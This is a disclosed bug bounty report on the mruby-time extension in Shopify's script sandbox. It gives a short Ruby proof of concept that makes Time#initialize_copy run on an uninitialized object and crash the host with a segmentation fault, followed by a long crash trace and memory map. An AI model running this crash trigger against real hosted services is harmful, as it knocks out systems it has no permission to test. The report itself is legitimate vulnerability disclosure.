# mruby-time: Crash host with uninitialized Time obj

## Report Details
- **Report ID**: 184661
- **URL**: https://hackerone.com/reports/184661
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-23T22:28:00.444Z
- **Disclosed**: 2016-12-16T22:19:43.205Z

## Reporter
- **Username**: brakhane
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
So once again, another try ;) (As always hopefully unknown and valid ;))

`Time::initialize_copy` performs its copy action even on `Time` objects on which `initialize` never ran, leading to a crash. 

The PoC crashes https://www.mruby.science/runs - didn't try Shopify production servers for the usual reasons.

As a sidenote: Matz has patched a memory leak in the `mruby-time` here: https://github.com/mruby/mruby/commit/d97a37eb7b4fe52bb1b16bb6f7410fbae85e3809 You probably want to pull this into your copy of mruby-time as this has the potential (not tested) to slowly eat up memory if this condition is hit on purpose. I didn't want to create its own bugreport for this as it's kind of minor and already known upstream.

# PoC
```
class Time
  def initialize
  end
end

a = Time.new
b = Time.new
a.initialize_copy b
```

# Traces

This can't be ran from the irb as the implicit printout will fail (without crashing), running it in the sandbox leads to the shown results:

```
$ bin/sandbox /tmp/test.mrb 
bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000
ruby 2.3.2p217 (2016-11-15 revision 56796) [x86_64-linux]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:002238 EVAL   bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:0018c0 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:20:in `<main>'
bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f5119cba5d3 RBP: 0x00007f51187f14e0 RSP: 0x00007f51187efab0
 RAX: 0x00007f51188144a0 RBX: 0x00007f51187f94f0 RCX: 0x0000000000000000
 RDX: 0x0000000000000000 RDI: 0x0000000055504410 RSI: 0x00007f5119f29c10
  R8: 0x00007f51187f94c0  R9: 0x0000000000000001 R10: 0x0000000000000177
 R11: 0x00007f5119cb0f60 R12: 0x00007f51187f94f0 R13: 0x000000000000004d
 R14: 0x00007f51187f14e0 R15: 0x00007f51187f1f60 EFL: 0x0000000000010246

-- C level backtrace information -------------------------------------------
/usr/lib/libruby.so.2.3 [0x7f511dd49425]
/usr/lib/libruby.so.2.3 [0x7f511dd4965c]
/usr/lib/libruby.so.2.3 [0x7f511dc23e34]
/usr/lib/libruby.so.2.3 [0x7f511dcd56ce]
/usr/lib/libc.so.6 [0x7f511d8490b0]
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_time_initialize_copy+0x73) [0x7f5119cba5d3] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7f5119c79dbf] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f5119c7f607] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f5119c60613] ../../../../ext/mruby_engine/eval_monitored.c:68
/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7f511d600454]
/usr/lib/libc.so.6(clone+0x5f) [0x7f511d8fe7df]

-- Other runtime information -----------------------------------------------

* Loaded script: bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb
    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb
    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb
    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb
   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb
   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb
   12 /usr/lib/ruby/2.3.0/rubygems/version.rb
   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb
   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb
   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb
   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb
   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb
   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb
   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb
   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb
   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb
   23 /usr/lib/ruby/2.3.0/monitor.rb
   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb
   25 /usr/lib/ruby/2.3.0/rubygems.rb
   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb
   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb
   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb
   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb
   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb
   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb
   32 /usr/lib/ruby/2.3.0/delegate.rb
   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb
   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb
   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb
   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb
   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb
   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb
   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb
   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
   41 /usr/lib/ruby/2.3.0/pathname.rb
   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb
   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb
   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb
   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb
   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb
   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb
   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb
   51 /usr/lib/ruby/2.3.0/fileutils.rb
   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb
   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb
   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
   56 /usr/lib/ruby/2.3.0/socket.rb
   57 /usr/lib/ruby/2.3.0/timeout.rb
   58 /usr/lib/ruby/2.3.0/net/protocol.rb
   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb
   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb
   61 /usr/lib/ruby/2.3.0/uri/common.rb
   62 /usr/lib/ruby/2.3.0/uri/generic.rb
   63 /usr/lib/ruby/2.3.0/uri/ftp.rb
   64 /usr/lib/ruby/2.3.0/uri/http.rb
   65 /usr/lib/ruby/2.3.0/uri/https.rb
   66 /usr/lib/ruby/2.3.0/uri/ldap.rb
   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb
   68 /usr/lib/ruby/2.3.0/uri/mailto.rb
   69 /usr/lib/ruby/2.3.0/uri.rb
   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb
   72 /usr/lib/ruby/2.3.0/net/http/header.rb
   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb
   75 /usr/lib/ruby/2.3.0/net/http/request.rb
   76 /usr/lib/ruby/2.3.0/net/http/requests.rb
   77 /usr/lib/ruby/2.3.0/net/http/response.rb
   78 /usr/lib/ruby/2.3.0/net/http/responses.rb
   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb
   80 /usr/lib/ruby/2.3.0/net/http/backward.rb
   81 /usr/lib/ruby/2.3.0/net/http.rb
   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
   83 /usr/lib/ruby/2.3.0/date.rb
   84 /usr/lib/ruby/2.3.0/time.rb
   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb
   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb
   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb
   88 /usr/lib/ruby/2.3.0/rubygems/request.rb
   89 /usr/lib/ruby/2.3.0/cgi/core.rb
   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
   91 /usr/lib/ruby/2.3.0/cgi/util.rb
   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb
   93 /usr/lib/ruby/2.3.0/cgi.rb
   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb
   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
   96 /usr/lib/ruby/2.3.0/digest.rb
   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
   98 /usr/lib/ruby/2.3.0/openssl/bn.rb
   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb
  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb
  101 /usr/lib/ruby/2.3.0/openssl/config.rb
  102 /usr/lib/ruby/2.3.0/openssl/digest.rb
  103 /usr/lib/ruby/2.3.0/openssl/x509.rb
  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb
  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb
  107 /usr/lib/ruby/2.3.0/openssl.rb
  108 /usr/lib/ruby/2.3.0/securerandom.rb
  109 /usr/lib/ruby/2.3.0/resolv.rb
  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb
  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb
  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb
  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb
  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb
  116 /usr/lib/ruby/2.3.0/rubygems/util.rb
  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb
  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb
  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb
  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb
  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb
  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb
  123 /usr/lib/ruby/2.3.0/rubygems/source.rb
  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb
  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb
  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb
  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb
  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb
  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb
  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb
  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb
  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb
  133 /usr/lib/ruby/2.3.0/tmpdir.rb
  134 /usr/lib/ruby/2.3.0/tempfile.rb
  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb
  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb
  137 /usr/lib/ruby/2.3.0/optparse.rb
  138 /usr/lib/ruby/2.3.0/rubygems/command.rb
  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb
  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb
  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb
  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb
  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb
  145 /usr/lib/ruby/2.3.0/rubygems/text.rb
  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb
  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb
  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb
  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb
  150 /usr/lib/ruby/2.3.0/set.rb
  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb
  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb
  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb
  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb
  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb
  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb
  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb
  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb
  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb
  160 /usr/lib/ruby/2.3.0/tsort.rb
  161 /usr/lib/ruby/2.3.0/forwardable.rb
  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb
  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb
  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb
  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb
  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb
  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb
  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb
  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb
  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb
  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb
  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb
  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb
  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb
  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb
  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb
  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb
  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb
  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb
  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb
  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb
  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb
  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb
  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb
  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb
  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb
  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb
  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb
  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb
  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb
  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb
  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb
  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb
  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb
  195 /usr/lib/ruby/2.3.0/json/version.rb
  196 /usr/lib/ruby/2.3.0/ostruct.rb
  197 /usr/lib/ruby/2.3.0/json/generic_object.rb
  198 /usr/lib/ruby/2.3.0/json/common.rb
  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
  205 /usr/lib/ruby/2.3.0/json/ext.rb
  206 /usr/lib/ruby/2.3.0/json.rb
  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb

* Process memory map:

00400000-00401000 r-xp 00000000 08:03 948906                             /usr/bin/ruby
00600000-00601000 r--p 00000000 08:03 948906                             /usr/bin/ruby
00601000-00602000 rw-p 00001000 08:03 948906                             /usr/bin/ruby
0171f000-0282e000 rw-p 00000000 00:00 0                                  [heap]
7f5110000000-7f5110021000 rw-p 00000000 00:00 0 
7f5110021000-7f5114000000 ---p 00000000 00:00 0 
7f5117554000-7f5117980000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7f5117980000-7f5117b5d000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so
7f5117b5d000-7f5117dd9000 r--s 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0
7f5117dd9000-7f5117def000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1
7f5117def000-7f5117fee000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1
7f5117fee000-7f5117fef000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1
7f5117fef000-7f5117ff0000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1
7f5117ff0000-7f5117ff1000 ---p 00000000 00:00 0 
7f5117ff1000-7f5118bf1000 rw-p 00000000 00:00 0 
7f5118bf1000-7f5118bf8000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7f5118bf8000-7f5118df8000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7f5118df8000-7f5118df9000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7f5118df9000-7f5118dfa000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7f5118dfa000-7f5118dfb000 r-xp 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7f5118dfb000-7f5118ffa000 ---p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7f5118ffa000-7f5118ffb000 r--p 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7f5118ffb000-7f5118ffc000 rw-p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7f5118ffc000-7f5118ffd000 r-xp 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7f5118ffd000-7f51191fc000 ---p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7f51191fc000-7f51191fd000 r--p 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7f51191fd000-7f51191fe000 rw-p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7f51191fe000-7f51191ff000 r-xp 00000000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7f51191ff000-7f51193ff000 ---p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7f51193ff000-7f5119400000 r--p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7f5119400000-7f5119401000 rw-p 00002000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7f5119401000-7f5119402000 r-xp 00000000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7f5119402000-7f5119602000 ---p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7f5119602000-7f5119603000 r--p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7f5119603000-7f5119604000 rw-p 00002000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7f5119604000-7f511960a000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7f511960a000-7f5119809000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7f5119809000-7f511980a000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7f511980a000-7f511980b000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7f511980b000-7f5119830000 r-xp 00000000 08:03 935807                     /usr/lib/liblzma.so.5.2.2
7f5119830000-7f5119a2f000 ---p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2
7f5119a2f000-7f5119a30000 r--p 00024000 08:03 935807                     /usr/lib/liblzma.so.5.2.2
7f5119a30000-7f5119a31000 rw-p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2
7f5119a31000-7f5119a3c000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7f5119a3c000-7f5119c3b000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7f5119c3b000-7f5119c3c000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7f5119c3c000-7f5119c3d000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7f5119c3d000-7f5119c4b000 rw-p 00000000 00:00 0 
7f5119c4b000-7f5119d29000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7f5119d29000-7f5119f28000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7f5119f28000-7f5119f2a000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7f5119f2a000-7f5119f2c000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7f5119f2c000-7f5119f31000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7f5119f31000-7f511a130000 ---p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7f511a130000-7f511a131000 r--p 00004000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7f511a131000-7f511a132000 rw-p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7f511a132000-7f511a133000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7f511a133000-7f511a332000 ---p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7f511a332000-7f511a333000 r--p 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7f511a333000-7f511a334000 rw-p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7f511a334000-7f511a335000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7f511a335000-7f511a535000 ---p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7f511a535000-7f511a536000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7f511a536000-7f511a537000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7f511a537000-7f511a53a000 r-xp 00000000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7f511a53a000-7f511a739000 ---p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7f511a739000-7f511a73a000 r--p 00002000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7f511a73a000-7f511a73b000 rw-p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7f511a73b000-7f511a989000 r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7f511a989000-7f511ab88000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7f511ab88000-7f511aba4000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7f511aba4000-7f511abb0000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7f511abb0000-7f511abb3000 rw-p 00000000 00:00 0 
7f511abb3000-7f511ac1a000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7f511ac1a000-7f511ae19000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7f511ae19000-7f511ae1d000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7f511ae1d000-7f511ae24000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7f511ae24000-7f511ae73000 r-xp 00000000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
